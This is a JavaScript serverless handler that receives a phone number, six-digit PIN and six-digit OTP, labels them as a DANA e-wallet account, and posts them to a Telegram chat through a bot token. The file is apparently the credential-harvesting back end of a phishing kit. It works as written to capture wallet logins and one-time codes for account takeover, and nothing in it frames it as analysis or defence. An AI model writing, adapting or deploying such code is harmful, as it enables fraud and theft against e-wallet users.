const axios = require('axios');

// Helper function to format the message
function formatMessage(type, phone, pin, otp) {
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

// Helper function to validate phone number
function isValidPhone(phone) {
  return phone && /^[0-9]{10,13}$/.test(phone);
}

// Main Lambda function
exports.handler = async (event, context) => {
  // Set default headers
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST'
  };

  // Handle CORS preflight request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers,
      body: ''
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ 
        error: 'Method Not Allowed',
        message: 'Only POST requests are accepted'
      })
    };
  }

  try {
    // Parse and validate request body
    if (!event.body) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Bad Request',
          message: 'Request body is missing'
        })
      };
    }

    let requestBody;
    try {
      requestBody = JSON.parse(event.body);
    } catch (e) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Bad Request',
          message: 'Invalid JSON format in request body'
        })
      };
    }

    const { type, phone, pin, otp } = requestBody;
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';

    // Validate required fields
    if (!type || !cleanPhone) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Bad Request',
          message: 'Type and phone number are required',
          received: { type, phone }
        })
      };
    }

    // Validate phone number format
    if (!isValidPhone(cleanPhone)) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Invalid Phone Number',
          message: 'Phone number must be 10-13 digits',
          received: phone,
          cleaned: cleanPhone
        })
      };
    }

    // Validate PIN if present
    if (type === 'pin' && (!pin || pin.length !== 6 || !/^[0-9]+$/.test(pin))) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Invalid PIN',
          message: 'PIN must be 6 digits'
        })
      };
    }

    // Validate OTP if present
    if (type === 'otp' && (!otp || otp.length !== 6 || !/^[0-9]+$/.test(otp))) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Invalid OTP',
          message: 'OTP must be 6 digits'
        })
      };
    }

    // Check Telegram credentials
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Server Configuration Error',
          message: 'Telegram credentials are not configured'
        })
      };
    }

    // Format and send message to Telegram
    const message = formatMessage(type, cleanPhone, pin, otp);
    
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );

    // Return success response
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent successfully',
        telegram_status: telegramResponse.status,
        data_sent: {
          type,
          phone: cleanPhone,
          pin: pin ? '******' : undefined,
          otp: otp ? '******' : undefined
        }
      })
    };

  } catch (error) {
    console.error('Error processing request:', error);
    
    // Handle Axios errors specifically
    if (error.isAxiosError) {
      return {
        statusCode: 502,
        headers,
        body: JSON.stringify({
          error: 'Telegram API Error',
          message: 'Failed to send message to Telegram',
          details: error.message,
          response: error.response ? {
            status: error.response.status,
            data: error.response.data
          } : undefined
        })
      };
    }

    // Generic error handler
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal Server Error',
        message: 'An unexpected error occurred',
        details: error.message
      })
    };
  }
};
